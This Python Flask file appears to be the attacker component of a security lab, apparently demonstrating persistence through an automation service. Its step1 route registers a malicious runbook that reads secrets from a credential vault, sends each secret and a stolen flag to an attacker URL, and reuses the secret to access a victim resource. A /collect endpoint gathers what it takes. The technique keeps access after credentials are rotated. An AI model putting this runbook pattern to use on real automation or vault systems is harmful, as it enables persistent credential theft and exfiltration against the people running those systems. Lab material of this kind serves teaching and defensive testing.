"""Persistence-as-a-service: automation survives credential rotation."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
AUTOMATION = os.environ.get("AUTOMATION_URL", "http://automation-service:5000")
VAULT = os.environ.get("VAULT_URL", "http://credential-vault:5000")
VICTIM = os.environ.get("VICTIM_URL", "http://victim-resource:5000")
VAULT_TOKEN = os.environ.get("VAULT_TOKEN", "vault-token-abc")

_collect = []

HTML = """<h1>Persistence-as-a-Service</h1>
<form method="post" action="/step1"><h3>1 · register a malicious runbook</h3>
<button>Register</button></form>
<form method="post" action="/step2"><h3>2 · rotate credentials (defender action)</h3>
<button>Rotate</button></form>
<form method="post" action="/step3"><h3>3 · wait for the runbook to re-establish access</h3>
<button>Poll collection</button></form>
<pre>{{out}}</pre>"""


def render(out):
    return HTML.replace("{{out}}", out)


@app.route("/")
def home():
    return render("Ready")


@app.route("/step1", methods=["POST"])
def step1():
    script = (
        "python3 - <<'PY'\n"
        "import json, os, urllib.request\n"
        "vault = os.environ['VAULT_URL']; token = os.environ['VAULT_TOKEN']\n"
        "req = urllib.request.Request(vault + '/credentials', headers={'X-Vault-Token': token})\n"
        "secret = json.load(urllib.request.urlopen(req))['secret']\n"
        "urllib.request.urlopen(os.environ['ATTACKER_URL'] + '/collect?secret=' + secret)\n"
        "req2 = urllib.request.Request(os.environ['VICTIM_URL'] + '/flag', headers={'Authorization': 'Bearer ' + secret})\n"
        "flag = json.load(urllib.request.urlopen(req2))['flag']\n"
        "urllib.request.urlopen(os.environ['ATTACKER_URL'] + '/collect?flag=' + flag)\n"
        "PY"
    )
    r = requests.post(f"{AUTOMATION}/runbooks",
                      json={"script": script, "attacker_url": f"http://attacker:5000"},
                      timeout=8)
    return render(f"Runbook registered: {r.text}")


@app.route("/step2", methods=["POST"])
def step2():
    r = requests.post(f"{VAULT}/rotate", headers={"X-Vault-Token": VAULT_TOKEN}, timeout=8)
    v = requests.post(f"{VICTIM}/activate", json={"secret": r.json()["secret"]}, timeout=8)
    return render(f"Rotation: {r.text}\nResource updated: {v.text}")


@app.route("/step3", methods=["POST"])
def step3():
    return render(f"Collected so far:\n" + "\n".join(_collect) if _collect else
                  "Nothing yet — runbook runs every 5s; try again.")


@app.route("/collect")
def collect():
    for key in ("secret", "flag"):
        v = request.args.get(key)
        if v:
            _collect.append(f"{key}={v}")
    return "ok"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
